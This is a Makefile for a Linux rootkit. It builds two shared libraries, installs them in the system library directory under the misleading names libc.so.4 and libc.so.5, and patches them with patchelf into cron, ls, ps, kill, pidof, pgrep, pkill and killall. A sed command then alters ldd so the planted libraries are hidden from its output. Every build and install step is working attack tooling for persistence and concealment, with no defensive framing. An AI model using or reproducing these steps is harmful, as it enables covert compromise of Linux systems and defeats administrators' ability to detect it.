CC       := cc
LIBEXEC  := libexec.so
LIBHIDE  := libhide.so
BINDIR   := /lib/x86_64-linux-gnu
ACTION   := ./patchelf --add-needed
CFLAGS   := -fPIC -Wall -Wextra -Werror -pedantic -O2 -pipe -std=c17 -march=native -shared -ldl -static -s -nostartfiles
LDFLAGS  := -Wl,-z,norelro -Wl,-O1 -Wl,--build-id=none -Wl,-z,separate-code

TARGETS := $(LIBEXEC) $(LIBHIDE)

.PHONY: all clean install

all: $(TARGETS)

$(LIBEXEC): libexec.c
        $(CC) $(CFLAGS) -o $@ $< $(LDFLAGS)

$(LIBHIDE): libhide.c
        $(CC) $(CFLAGS) -o $@ $< $(LDFLAGS)

install: all
        cp $(LIBEXEC) $(BINDIR)/libc.so.4
        cp $(LIBHIDE) $(BINDIR)/libc.so.5

        systemctl stop cron
        chmod +x ./patchelf
        $(ACTION) $(BINDIR)/libc.so.4 $$(which cron)
        systemctl start cron

        $(ACTION) $(BINDIR)/libc.so.5 /bin/ls
        $(ACTION) $(BINDIR)/libc.so.5 $$(which ps)
        $(ACTION) $(BINDIR)/libc.so.5 $$(which kill)
        $(ACTION) $(BINDIR)/libc.so.5 $$(which pidof)
        $(ACTION) $(BINDIR)/libc.so.5 $$(which pgrep)
        $(ACTION) $(BINDIR)/libc.so.5 $$(which pkill)
        $(ACTION) $(BINDIR)/libc.so.5 $$(which killall)

        sed -i 's/try_trace \"$RTLD\" \"$file\" || result=1/try_trace \"$RTLD\" \"$file\" | grep -vE \"libc.so.4|libc.so.5\" || result=1/g' $$(which ldd)

clean:
        rm -f $(TARGETS)
